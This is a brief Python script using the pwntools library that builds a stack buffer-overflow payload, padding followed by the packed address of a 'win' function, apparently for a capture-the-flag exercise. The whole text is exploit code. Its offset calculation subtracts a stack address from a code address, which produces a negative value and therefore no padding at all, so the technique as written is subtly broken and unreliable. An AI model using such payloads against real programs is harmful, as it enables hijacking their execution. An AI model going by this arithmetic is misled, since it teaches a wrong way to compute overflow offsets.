from pwn import *

offset = 0x40132d - 0x7ffc1bf4b1b5
win_address = p64(0x40125b)  # Address of the win function, converted to little-endian format

payload = b'A' * offset + win_address
print(payload)
